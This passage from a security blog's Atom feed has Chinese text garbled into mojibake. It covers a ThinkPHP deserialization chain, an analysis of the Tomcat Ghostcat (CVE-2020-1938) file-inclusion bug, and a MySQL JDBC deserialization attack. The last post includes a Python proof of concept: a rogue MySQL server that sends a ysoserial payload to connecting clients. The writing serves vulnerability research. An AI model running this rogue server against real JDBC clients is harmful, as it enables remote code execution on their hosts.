punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Ê≥®ÊÑè"><a href="#Ê≥®ÊÑè" class="headerlink" title="Ê≥®ÊÑè"></a>Ê≥®ÊÑè</h2><h3 id="parent-‰øÆÈ•∞ËØç"><a href="#parent-‰øÆÈ•∞ËØç" class="headerlink" title="parent ‰øÆÈ•∞ËØç"></a>parent ‰øÆÈ•∞ËØç</h3><p>‰∏çÂêå TP ÁâàÊú¨‰∏≠ÔºåÂØπ‰∫é<code>$parent</code>‰øÆÈ•∞ËØç‰∏çÂêåÔºåÊâÄ‰ª•ÂàùÂßãÂåñË¶ÜÁõñÊó∂ÈúÄË¶ÅÊ≥®ÊÑè‰ª•Â≠êÁ±ª‰∏∫‰∏ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827032216313.jpg" alt="-w1041"></p><h3 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h3><p>Êó¢ÁÑ∂Ë¶ÅÂá∫Áé∞<code>&lt;</code>ÂΩìÁÑ∂ÊòØÂè™ËÉΩ Linux ÁéØÂ¢É‰∫Ü</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">ThinkPHP v5.0.x ÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÊåñÊéò</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Áî±‰∫éÊüê‰∫õÂéüÂõ†Â≠¶‰π†‰∫Ü‰∏ãÁõ∏ÂÖ≥ÂÜÖÂÆπÔºå‰ª•Ê≠§ÂÅö‰∏ãÁ¨îËÆ∞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="‰ª£Á†ÅÂÆ°ËÆ°" scheme="https://blog.sari3l.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="https://blog.sari3l.com/tags/PHP/"/>
    
      <category term="ThinkPHP" scheme="https://blog.sari3l.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1938ÔºàGhost CatÔºâÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/7d9ef63e/"/>
    <id>https://blog.sari3l.com/posts/7d9ef63e/</id>
    <published>2020-02-22T14:58:15.000Z</published>
    <updated>2020-07-06T09:44:55.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÂΩ±ÂìçËåÉÂõ¥"><a href="#ÂΩ±ÂìçËåÉÂõ¥" class="headerlink" title="ÂΩ±ÂìçËåÉÂõ¥"></a>ÂΩ±ÂìçËåÉÂõ¥</h2><ul><li>7.*ÂàÜÊîØ7.0.100‰πãÂâçÁâàÊú¨ÔºåÂª∫ËÆÆÊõ¥Êñ∞Âà∞7.0.100ÁâàÊú¨</li><li>8.*ÂàÜÊîØ8.5.51‰πãÂâçÁâàÊú¨ÔºåÂª∫ËÆÆÊõ¥Êñ∞Âà∞8.5.51ÁâàÊú¨</li><li>9.*ÂàÜÊîØ9.0.31‰πãÂâçÁâàÊú¨ÔºåÂª∫ËÆÆÊõ¥Êñ∞Âà∞9.0.31ÁâàÊú¨</li></ul><h2 id="Âü∫Á°ÄÂÜÖÂÆπ"><a href="#Âü∫Á°ÄÂÜÖÂÆπ" class="headerlink" title="Âü∫Á°ÄÂÜÖÂÆπ"></a>Âü∫Á°ÄÂÜÖÂÆπ</h2><h3 id="AJP-ÂçèËÆÆ"><a href="#AJP-ÂçèËÆÆ" class="headerlink" title="AJP ÂçèËÆÆ"></a>AJP ÂçèËÆÆ</h3><p>Ê†πÊçÆ<a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">ÂÆòÊñπÊñáÊ°£</a>ÔºåÂæàÂÆπÊòìÁºñÂÜô POC</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823837381066.jpg" alt="-w604"></p><h3 id="Tomcat-Ëß£ÊûêÊµÅÁ®ãÈÉ®ÂàÜÂÜÖÂÆπ"><a href="#Tomcat-Ëß£ÊûêÊµÅÁ®ãÈÉ®ÂàÜÂÜÖÂÆπ" class="headerlink" title="Tomcat Ëß£ÊûêÊµÅÁ®ãÈÉ®ÂàÜÂÜÖÂÆπ"></a>Tomcat Ëß£ÊûêÊµÅÁ®ãÈÉ®ÂàÜÂÜÖÂÆπ</h3><p>ÈÄöËøá<code>org.apache.catalina.connector.CoyoteAdapter#postParseRequest</code>ÊñπÊ≥ïÔºåÂ∞Ü<code>org.apache.coyote.Request</code>‰∏≠ÁöÑÂÜÖÂÆπËß£ÊûêÂà∞<code>org.apache.catalina.connector.Request</code>‰∏≠</p><ul><li>reqÂíåresÊòØadapter.serviceÁöÑÂèÇÊï∞</li><li>requestÂíåresponseÊòØ‰πãÂêéÂ∞ÜË¶ÅË∞ÉÁî®ÊñπÊ≥ïÁöÑÂèÇÊï∞</li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822936892645.jpg" alt="-w751"></p><p>ËÄåÂú®org.apache.catalina.mapper.Mapper#internalMap‰∏≠Ôºå‰ºöÈÄöËøáÈÅçÂéÜÊ≥®ÂÜåÁöÑ contextÔºåÈÄâÂèñÂêéÈù¢Â∞ÜÈááÁî®ÁöÑ‰∏ä‰∏ãÊñáÂÜÖÂÆπ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/map%20%E6%98%A0%E5%B0%84%E6%9F%A5%E6%89%BE%20context.png" alt="map Êò†Â∞ÑÊü•Êâæ context"></p><p>contextVersion.resources Â∞ÜË¢´‰º†ÈÄí‰∏ªË¶ÅÊúâ‰∏§ÁÇπ‰ΩúÁî®</p><ol><li>allResources ËÆ∞ÂΩï webapps ÂàóË°® </li><li>cache Ë¢´Áî®‰∫éÊü•ËØ¢ËµÑÊ∫êÁºìÂ≠ò</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822933382195.jpg" alt="-w748"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822972672708.jpg" alt="-w1180"></p><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823839595422.jpg" alt="-w673"></p><h3 id="DefaultServlet"><a href="#DefaultServlet" class="headerlink" title="DefaultServlet"></a>DefaultServlet</h3><p>Âú®<code>org.apache.catalina.servlets.DefaultServlet</code>‰∏≠‰∏§‰∏™ÂÖ≥ÈîÆÁÇπ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822955189031.jpg" alt="-w641"></p><ol><li><p>Á¨¨‰∏Ä‰∏™Êñ≠ÁÇπÂ§ÑÔºåÈÄöËøá<code>getRelativePath</code>ÊñπÊ≥ïÊãºÊé•servletPathÂèäpath_infoËé∑ÂèñËµÑÊ∫êÁõ∏ÂØπË∑ØÂæÑ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822953862652.jpg" alt="-w1071"></p></li><li><p>Á¨¨‰∫å‰∏™Êñ≠ÁÇπÂ§ÑÔºåÁî®‰∫éLFIËØªÂèñËµÑÊ∫êÔºå‰∏ªË¶ÅÂú®‰∫éÈÄöËøá resourceCache Ëé∑ÂèñËµÑÊ∫êÁºìÂ≠ò</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15822974093233.jpg" alt="-w1043"></p><p> ËøîÂõûÂêé‰ºöËøõ‰∏ÄÊ≠•ÂØπËµÑÊ∫êÊúâÊïàÊÄßËøõË°åÊ£ÄÊü•ÔºåÊ≠§Êó∂Â∞±Áî®Âà∞‰∫Ü‰∏äÈù¢ÊèêÂà∞ÁöÑallResources</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823470477609.jpg" alt="-w717"></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823474384469.jpg" alt="-w1565"></p></li></ol><h3 id="JspServlet"><a href="#JspServlet" class="headerlink" title="JspServlet"></a>JspServlet</h3><p><code>org.apache.jasper.servlet.JspServlet</code>ÂÆûÈôÖÂíåDefaultServletÈÄªËæëÂæàÁõ∏‰ºº<br>ÂÖàÈÄöËøáÊãºÊé•servletPathÂèäpath_infoËé∑ÂèñjspÊñá‰ª∂uri</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823651035294.jpg" alt="-w649"></p><p>ÁÑ∂ÂêéËøõÂÖ•<code>org.apache.jasper.servlet.JspServlet#serviceJspFile</code>ÔºåËøôÈáåÂ∞ÜÁõÆÊ†áÊÅ∂ÊÑèÊñá‰ª∂‰Ωú‰∏∫ servlet ËøõË°åÂ§ÑÁêÜ</p><blockquote><ol><li>ServletÂÆπÂô®Ë¥üË¥£‰∏∫‰ΩøÁî®JasperÁöÑWebÂ∫îÁî®Á®ãÂ∫è‰∏ä‰∏ãÊñáÊèê‰æõURLClassLoader</li><li>JspServletÂ∞ÜËØ∑Ê±ÇËΩ¨ÁªôJspServletWrapperÁöÑserviceÊñπÊ≥ïËøõË°åÂ§ÑÁêÜ</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823652759535.jpg" alt="-w1046"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823826112197.jpg" alt="-w963"></p><h4 id="Ë∞ÉÁî®Ê†à"><a href="#Ë∞ÉÁî®Ê†à" class="headerlink" title="Ë∞ÉÁî®Ê†à"></a>Ë∞ÉÁî®Ê†à</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/7d9ef63e/15823832619467.jpg" alt="-w544"></p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://www.cnblogs.com/coldridgeValley/p/6252781.html" target="_blank" rel="noopener">TomcatÂØπHTTPËØ∑Ê±ÇÁöÑÂ§ÑÁêÜ(‰∫å)</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ÂèØÂà©Áî®ÁöÑ servlet ÊÑüËßâÂèØ‰ª•Êé¢Á¥¢‰∏ÄÊ≥¢&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Tomcat" scheme="https://blog.sari3l.com/tags/Tomcat/"/>
    
      <category term="LFI" scheme="https://blog.sari3l.com/tags/LFI/"/>
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>JDBC Deserialization</title>
    <link href="https://blog.sari3l.com/posts/2cc5b12d/"/>
    <id>https://blog.sari3l.com/posts/2cc5b12d/</id>
    <published>2020-01-17T11:42:17.000Z</published>
    <updated>2020-07-06T09:45:17.435Z</updated>
    
    <content type="html"><![CDATA[<p>Âú® <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-jdbc-url-format.html" target="_blank" rel="noopener">JDBC URL ËØ≠Ê≥ï</a>‰∏≠ÔºåÊòØÂèØ‰ª•Á±ª‰ºº‰∫é get ËÆæÁΩÆËØ∑Ê±Ç<a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html" target="_blank" rel="noopener">Â±ûÊÄß</a>ÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15792595186616.jpg" alt="-w283"></p><p>Âú®ËøôÈáåÊúâ‰∏§‰∏™ÂΩ±ÂìçÊ≠§ÊºèÊ¥ûÁöÑÂÖ≥ÈîÆÂ±ûÊÄß</p><table><thead><tr><th>Properties</th><th>Descriptions</th></tr></thead><tbody><tr><td>autoDeserialize</td><td>Should the driver automatically detect and de-serialize objects stored in BLOB fields?<br><br>Default: false<br><br>Since version: 3.1.5</td></tr><tr><td>queryInterceptors</td><td>A comma-delimited list of classes that implement ‚Äúcom.mysql.cj.interceptors.QueryInterceptor‚Äù that should be placed ‚Äúin between‚Äù query execution to influence the results. QueryInterceptors are ‚Äúchainable‚Äù, the results returned by the ‚Äúcurrent‚Äù interceptor will be passed on to the next in in the chain, from left-to-right order, as specified in this property.<br><br>Since version: 8.0.7</td></tr></tbody></table><p>ÁÆÄÂçïÂú∞ËØ¥Ôºö</p><ul><li><code>queryInterceptors</code>Âú®ÊâßË°åÊü•ËØ¢ÂâçËøõË°åÊã¶Êà™Âπ∂Â§ÑÁêÜ</li><li><code>autoDeserialize</code>Âú®ÈÅáÂà∞ blob Á±ªÂûã‰ºöÊâßË°åÂèçÂ∫èÂàóÂåñ</li></ul><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>ÈÄöËøáÁÆÄÂçïÁöÑË∞ÉËØïÔºåÂèØ‰ª•ÁúãÂà∞Âú®ServerStatusDiffInterceptor Êã¶Êà™Âô®ËøõË°åÈ¢ÑÂ§ÑÁêÜÊó∂Ôºå‰ºöÊü•ËØ¢ÊúçÂä°Âô® session Áä∂ÊÄÅ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15792599910076.jpg" alt="-w1031"></p><p>‰πãÂêéÂàÜÂà´ËØªÂèñ key Âíå value Â≠òÊîæÂà∞ map ‰∏≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15792600601748.jpg" alt="-w1078"></p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂΩìÊï∞ÊçÆÁ±ªÂûã‰∏∫ BLOB Êó∂Ôºå‰∏î autoDeserialize ÂºÄÂêØÊÉÖÂÜµ‰∏ãÔºåÂ∞±‰ºöËØªÂèñÊï∞ÊçÆÊµÅÂπ∂ÊâßË°åÂèçÂ∫èÂàóÂåñ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15788858814632.jpg" alt="-w1502"></p><p>Ë∑üÂÖ•ÂÆûÈôÖÊµÅÁ®ãÔºåÂèëÁé∞‰ºöÂÖàÂêéËß¶Âèë preProcess ‰ª•Âèä postProcessÔºåÊâÄ‰ª•‰ºöËØ∑Ê±Ç‚ÄùSHOW SESSION STATUS‚Äù‰∏§Ê¨°</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15792610322507.jpg" alt="-w813"></p><p>ÈÇ£‰πàËß¶ÂèëÊù°‰ª∂Â∞±ÊòØÂ§çÂÜô<code>show session status</code>ÔºåÂú® mysql ‰∏≠Êúâ‰∏Ä‰∏™Êèí‰ª∂Âè´ÂÅö<code>rewrite</code>ÔºåÂú®5.7.6ÂºÄÂßãÊîØÊåÅ<code>Query Rewrite</code>,ËÉΩÂ§üÂ∞ÜÁ¨¶ÂêàÂØπÂ∫îpatternÁöÑSQLËØ≠Âè•ËøõË°åÈáçÂÜô</p><p>‰ΩÜÂÆûÈôÖ‰∏äÔºåÁî±‰∫éÁõÆÊ†áËØ≠Âè•ÁöÑÁâπÊÆäÊÄßÔºåÊòØÊ≤°ÊúâÂäûÊ≥ïÈáçÂÜôÁöÑ</p><pre class=" language-shell"><code class="language-shell">mysql> insert into query_rewrite.rewrite_rules (pattern, replacement) values ('show session status', 'select 1,2');Query OK, 1 row affected (0.00 sec)mysql> call query_rewrite.flush_rewrite_rules();ERROR 1644 (45000): Loading of some rule(s) failed.</code></pre><p>‰∏§ÁßçËß£ÂÜ≥ÂäûÊ≥ï</p><ol><li>ÁºñËØërewrite_exampleÊèí‰ª∂ÔºåÂÖ∑‰ΩìÂèØËßÅ<a href="https://xz.aliyun.com/t/7067" target="_blank" rel="noopener">Ê≠§ÊñáÁ´†</a></li><li>‰º™Ë£Ö MysqlÔºåËá™ÂÆö‰πâÊï∞ÊçÆÊµÅÈáè</li></ol><p>ÂêéËÄÖÂú®ÂÜÖÁΩëÊ≤°ÊúâÂèØÊéß mysql ÊÉÖÂÜµ‰∏ã‰ºöÂæàÂ•ΩÁî®ÔºåÊØïÁ´üÂâçËÄÖÂä®‰ΩúÂ§™Â§ß‰∫ÜËøòË¶Å‰∏¥Êó∂ÁºñËØë</p><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><p>ÊµãËØïÊü•ÁúãÊµÅÈáèÊó∂ÂÄôÈúÄË¶ÅÂºÄÂêØ<code>useSSL=false</code>ÔºåÂê¶ÂàôÊòØÂä†ÂØÜÁöÑÊï∞ÊçÆÂåÖ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/15791829419663.jpg" alt="-w1896"></p><p>ÂΩìÁÑ∂‰πüÂèØ‰ª•‰ΩøÁî® socket + ssl ‰º™Ë£Ö mysql ÊúçÂä°Á´Ø(ÊáíÂæóÂÜô==Ê≤°ËØïËøá)</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding : utf-8</span><span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">return_little_endian</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">return_hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    hex_s <span class="token operator">=</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> return_little_endian<span class="token punctuation">(</span><span class="token string">'0'</span> <span class="token operator">+</span> hex_s <span class="token keyword">if</span> len<span class="token punctuation">(</span>hex_s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token keyword">else</span> hex_s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">return_len_hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> return_little_endian<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># java -jar ysoserial-master.jar CommonsCollections5 "/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>payload <span class="token operator">=</span> <span class="token stringspan><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'4a0000000a352e372e3235000a00000041787403090e1e2500ffff080200ffc11500000000000000000000501d1d2e606244016f3f0e65006d7973716c5f6e61746976655f70617373776f726400'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'0700000200000002000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'01000001152e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002800000f0364656600000012706572666f726d616e63655f736368656d61000c3f000100000008800000000026000010036465660000001071756572795f63616368655f73697a65000c3f001500000008a00000000026000011036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000012036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000013036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000014036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001503646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000016036465660000000c776169745f74696d656f7574000c3f001500000008a0000000000d0100170131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f63690f757466385f67656e6572616c5f6369000532383830300347504c01300831363737373231360236300131083136373737323136034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e034353540653595354454d0f52455045415441424c452d5245414405323838303007000018fe000002000200'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'0700000100000002000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'0700000100000002000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'0100000102320000020364656604746573740a6a64626361747461636b0a6a64626361747461636b0269640269640c3f000b0000000300000000003c0000030364656604746573740a6a64626361747461636b0a6a64626361747461636b07636f6d6d616e6407636f6d6d616e640c3f00ffff0000fc9000000000'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'04'</span> <span class="token operator">+</span> <span class="token string">'0131fc'</span> <span class="token operator">+</span> return_hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">+</span> payloaddata_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> return_len_hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp <span class="token operator">+</span> <span class="token string">'05000006fe00002200'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>HOST <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>PORT <span class="token operator">=</span> <span class="token number">3306</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn <span class="token operator">=</span> None<span class="token keyword">print</span> <span class="token string">'Server start at: %s:%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'wait for connection...'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> conn <span class="token keyword">is</span> None<span class="token punctuation">:</span>            conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">'[+] Connected From'</span><span class="token punctuation">,</span> addr            <span class="token keyword">for</span> i <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>                conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"[-] Transfer End"</span>            <span class="token keyword">print</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            conn <span class="token operator">=</span> None    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># print('waiting...')</span>        conn <span class="token operator">=</span> None</code></pre><h3 id="ÊïàÊûú"><a href="#ÊïàÊûú" class="headerlink" title="ÊïàÊûú"></a>ÊïàÊûú</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/2cc5b12d/2020-01-17%2017.21.30.gif" alt="2020-01-17 17.21.30"></p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf" target="_blank" rel="noopener">New Exploit Technique In Java Deserialization Attack</a></li><li><a href="https://xz.aliyun.com/t/7067" target="_blank" rel="noopener">mysql jdbc ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊµãËØï</a></li><li><a href="http://www.fordba.com/mysql-query-rewrite-plugin-test.html" target="_blank" rel="noopener">MySQL Query Rewrite Plugin ÁÆÄÂçï‰ΩøÁî®ÊµãËØï</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‰º™Ë£Ö Mysql ÁúüÊúâË∂£&lt;/p&gt;
    
    </summary>
    
    
    
